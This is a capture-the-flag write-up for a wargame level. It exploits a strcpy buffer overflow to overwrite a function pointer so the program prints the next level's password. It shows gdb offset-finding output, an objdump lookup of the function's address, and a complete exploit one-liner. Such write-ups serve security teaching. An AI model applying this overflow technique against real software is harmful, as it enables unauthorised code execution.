# level6

- Three functions
    - `m` : prints "Nope"
    - `n` : prints next level password
    - `main` call the function `m`  pointed by `ppcVar1` 


- A buffer overflow vulnerability is present:
    ```c
    strcpy(buffer, argv[1]);
    ```
    - 64 bytes long are allocated for the buffer.
    - User's input is copied into the buffer without any boundary checking.

## Goal
Overflow to overwrite the content of the function pointer `ppcVar1` to point to the function `n` instead of `m`.

## Step 1
Find the offset to overwrite the function pointer `ppcVar1` thanks to the [pattern creator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)

```console
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
```

`0x41346341` is at the 72th position in the pattern.

We understand that the `strcpy` overwrite the function pointer at the 72th position.

### Solution

Put the address of the function `n` at the 72th position.

## Step 2
Find the address of the function `n`:

```console
objdump -d level6 | grep n
08048454 g     F .text	00000014              n
```

`0x08048454` is the address of the function `n`.

## Exploit
```bash
/home/user/level6/level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
```